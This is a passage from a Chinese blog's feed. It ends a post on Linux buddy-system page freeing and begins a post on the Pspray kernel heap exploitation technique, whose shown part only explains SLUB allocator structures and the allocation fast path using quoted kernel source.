class="line">EXPORT_SYMBOL(__free_pages);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (addr != <span class="number">0</span>) &#123;</span><br><span class="line">VM_BUG_ON(!virt_addr_valid((<span class="keyword">void</span> *)addr));</span><br><span class="line">__free_pages(virt_to_page((<span class="keyword">void</span> *)addr), order);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(free_pages);</span><br></pre></td></tr></table></figure><p>所有页面释放的函数其实都是对 <code>__free_one_page()</code> 的封装，最终都会调用到这个函数，前面是其中一条路的路径。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>🙏🙏🙏，这段时间实在是过于懒狗了，这是一篇2023年11月29号创建的文章，一直拖到今天才写完并发出来，虽然这段时间确实时不时会有一些事不过也不会耽误太多时间，说到底是我犯懒有时间不想写，其实就算晚上去玩游戏也是能早早写完了的，不做懒狗了！</p><p>后续关于syzkaller的文章可能会缓一段时间再继续写了，因为自己的fuzz基础其实不是很扎实，所以我打算先去学学怎样自己去实现一个fuzz再去看，如果直接看就算把逻辑理清楚了也没法自己动手改进之类的。</p><p>所以后续的更新大概率是<code>Linux Rootkit</code>，用户态fuzz实现，从0开始写操作系统等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实这一篇打算的是写&lt;code&gt;syz-fuzzer&lt;/code&gt;部分的源码分析或者是&lt;code&gt;Linux Rootkit&lt;/code&gt;这</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="buddy system" scheme="https://196082.github.io/tags/buddy-system/"/>
    
    <category term="内存管理" scheme="https://196082.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique</title>
    <link href="https://196082.github.io/2023/11/23/Pspray-Timing-Side-Channel-based-Linux-Kernel-Heap-Exploitation-Technique/"/>
    <id>https://196082.github.io/2023/11/23/Pspray-Timing-Side-Channel-based-Linux-Kernel-Heap-Exploitation-Technique/</id>
    <published>2023-11-23T09:05:25.000Z</published>
    <updated>2023-11-29T10:14:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期在工作上遇到的内核很少，以至于我都快忘记了我是玩内核的了。这篇文章需要一点<code>slub allocator</code>的基础，所以为什么我以前要偷懒不写<code>slub allocator</code>啊！！！当然这些基础在以前都是默认大家都已经学习过的了，在这里虽然可以一样这样，但是我觉得如果再不分析以后可能就没多少时间写这类分析细致的文章了。</p><h2 id="slub-allocator基本结构"><a href="#slub-allocator基本结构" class="headerlink" title="slub allocator基本结构"></a>slub allocator基本结构</h2><p><img   src="/images/ivPnbsjHyI94m5z.png" ></p><p>上面这张overview大家应该都挺熟悉的。</p><p>了解过Linux kernel内存管理的朋友应该知道<code>slab allocator</code>主要有三个版本：</p><ol><li>slab  最初的版本，机制复杂，效率低</li><li>slob  用于嵌入式场景的极简版本</li><li>slub  优化后的版本，现在常用</li></ol><p>所以后面均已slub为例。</p><h3 id="slab"><a href="#slab" class="headerlink" title="slab"></a>slab</h3><p>Linux kernel 中用以统筹所有内存的依然是<code>buddy system</code>，<code>slub allocator</code>也不例外，其负责向<code>buddy system</code>请求内存后分割给多个小 object 后再返还给上层调用者，单次向<code>buddy system</code>所请求的一份连续内存页便称之为一张 slab，在内核中对应 <code>slab</code> 结构体，本质上是复用 page 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">int</span> slabs;<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="keyword">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="keyword">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> system_has_freelist_aba</span></span><br><span class="line"><span class="keyword">freelist_aba_t</span> freelist_counter;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里简单解释一下前面的成员：</p><ul><li><code>slab_cache</code>: 该slab对应的内存池</li><li><code>freelist</code>: slab上空闲的第一个对象，形式为单向链表以NULL结尾</li><li><code>slab_list</code>: 按照其用途连接多个slabs双向链表</li><li><code>inuse</code>: 已被使用的对象数量</li><li><code>objects</code>: 该slab上的对象总数</li><li><code>frozen</code>: 是否被冻结，即其已经归属于特定的CPU</li></ul><blockquote><p>  这里我们需要注意的是 <strong>counters 成员直接涵盖了 inuse &amp; objects &amp; frozen</strong>，后面会有大量的直接通过 counters 成员进行赋值的操作，<strong>实际上就是赋值了 inuse &amp; objects &amp; frozen</strong></p></blockquote><p>和page结构体类似，这里slab也是对应一张slab内存页，可以通过<code>page_to_pfn</code>函数等可以直接完成slab结构体到内存页虚拟地址的转化，当然反过来也可以从一个空闲空间的虚拟地址找到其对应的slab结构体。</p><p><img   src="/images/cBXCGF4Z18VLMzl.png" ></p><h3 id="kmem-cache"><a href="#kmem-cache" class="headerlink" title="kmem_cache"></a>kmem_cache</h3><p><code>kmem_cache</code>想必各位较为熟悉，其用于分配特定大小对象的内存池，所有的<code>kmem_cache</code>构成一个双向链表，并存放于一个用于存放通用<code>kmem_cache</code>的数组<code>kmem_caches</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *</span></span><br><span class="line"><span class="class"><span class="title">kmalloc_caches</span>[<span class="title">NR_KMALLOC_TYPES</span>][<span class="title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="title">ro_after_init</span> =</span></span><br><span class="line">&#123; <span class="comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_caches);</span><br></pre></td></tr></table></figure><p>下面看一下<code>kmem_cache</code>的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLUB_TINY</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="keyword">slab_flags_t</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset;<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="comment">/* Number of per cpu partial slabs to keep around */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial_slabs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> allocflags;<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line"><span class="keyword">int</span> refcount;<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line"><span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;<span class="comment">/* Offset to metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> align;<span class="comment">/* Alignment */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;<span class="comment">/* Left redzone padding size */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name;<span class="comment">/* Name (only for display!) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span><span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN_GENERIC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先这里第一个成员<code>cpu_slab</code>其为<code>__percpu</code>变量指向一个<code>kmem_cache_cpu</code>结构体，即当前CPU独占的内存池。<code>min_partial</code>指的是<code>node partial</code>链表上slab的最大数量。<code>cpu_partial_slabs</code>指的是<code>cpu partial</code>链表上slab的最大数量。<code>size</code>一个对象的实际大小。<code>object_size</code>对象所有数据的大小。<code>offset</code>即空闲对象链表指针对于其对象的偏移。<code>min</code>一个slab上最少的对象数量。<code>allocflags</code>向<code>buddy system</code>申请页面时所使用的<code>gfp flag</code>。<code>ctor</code>对象的构造函数。</p><p><code>random_seq</code>: 用于在 slab 初始化时随机化 freelist 上空闲对象的连接顺序。</p><p><code>useroffset</code>: 用户空间能读写的起始偏移，后面的就时用户空间能读写的大小。</p><p><code>node</code>: 一个 <code>kmem_cache_node</code> 数组，对应多个不同 node 的后备内存池</p><p><img   src="/images/D4idvgzLAaqIBQM.png" ></p><p>关于其合并和类型之类的前面的文章提到过，可以去看看 <a class="link"   href="https://cv196082.gitee.io/2023/10/15/CVE-2022-0185/" >CVE-2022-0185复现<i class="fas fa-external-link-alt"></i></a> 。</p><h3 id="kmem-cache-cpu"><a href="#kmem-cache-cpu" class="headerlink" title="kmem_cache_cpu"></a>kmem_cache_cpu</h3><p>当一个进程请求分配内存时，首先会尝试向当前CPU的独占内存池进行分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> **freelist;<span class="comment">/* Pointer to next available object */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">freelist_aba_t</span> freelist_tid;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">local_lock_t</span> lock;<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line"><span class="keyword">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而这里的<code>kmem_cache_cpu</code>结构体代表的就是每个CPU独占的内存池。这里的结构体比较简单且眼熟，首先就是<code>freelist</code>含义一样指向下一个空闲的对象。<code>slab</code>指向当前用于分配的slab。<code>partial</code>指向的是<code>percpu partial list</code>链表。</p><p><img   src="/images/xSLqghNZ23nCMiz.png" ></p><h3 id="kmem-cache-node"><a href="#kmem-cache-node" class="headerlink" title="kmem_cache_node"></a>kmem_cache_node</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"> <span class="comment">// ... ...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="keyword">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="keyword">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其含义为每个node的后备内存池，当<code>percpu</code>的内存池分配完毕之后就会想node的后备内存池进行内存申请。</p><p>这里的<code>partial</code>成员同前面的一致，<code>nr_partial</code>很好理解，就是<code>partial</code>的数量。这里的<code>full</code>成员连接的是<code>slab page</code>中的所有对象都已经被使用的slab另外两个计数的也很好理解了。</p><p><img   src="/images/ECDOVtxAyiwd1UZ.png" ></p><h2 id="对象的分配"><a href="#对象的分配" class="headerlink" title="对象的分配"></a>对象的分配</h2><h3 id="slab-alloc-node"><a href="#slab-alloc-node" class="headerlink" title="slab_alloc_node"></a>slab_alloc_node</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __fastpath_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s, struct list_lru *lru,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obj_cgroup</span> *<span class="title">objcg</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> init = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="number">1</span>, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (!s)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">object = kfence_alloc(s, orig_size, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(object))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);</span><br><span class="line"></span><br><span class="line">maybe_wipe_obj_freeptr(s, object);</span><br><span class="line">init = slab_want_init_on_alloc(gfpflags, s);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When init equals &#x27;true&#x27;, like for kzalloc() family, only</span></span><br><span class="line"><span class="comment"> * @orig_size bytes might be zeroed instead of s-&gt;object_size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab_post_alloc_hook(s, objcg, gfpflags, <span class="number">1</span>, &amp;object, init, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是通过<code>slab_pre_alloc_hook</code>函数进行检测标识位，随后调用<code>kfence_alloc</code>进行内存错误检测，接下来调用<code>__slab_alloc_node</code>函数进行真正的内存分配，最后两个函数则是将对象原本用于存放<code>next object</code>的位置写为0，最后则是看标识位是否有<code>__GFP_ZERO</code>，若是有则调用<code>slab_post_alloc_hook</code>将堆块上的数据清零。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *__slab_alloc_node(struct kmem_cache *s,</span><br><span class="line"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">tid = READ_ONCE(c-&gt;tid);</span><br><span class="line">barrier();</span><br><span class="line">object = c-&gt;freelist;</span><br><span class="line">slab = c-&gt;slab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||</span><br><span class="line">    unlikely(!object || !slab || !node_match(slab, node))) &#123;</span><br><span class="line">object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!__update_cpu_freelist_fast(s, object, next_object, tid))) &#123;</span><br><span class="line">note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">prefetch_freepointer(s, next_object);</span><br><span class="line">stat(s, ALLOC_FASTPATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这里获取<code>percpu</code>上的<code>kmem_cache_cpu</code>，然后获得其<code>freelist</code>以及<code>slab</code>。若 slab 或 freelist 为空 &#x2F; slab 与 node 不匹配，则调用 <code>__slab_alloc()</code> 分配一张新 slab 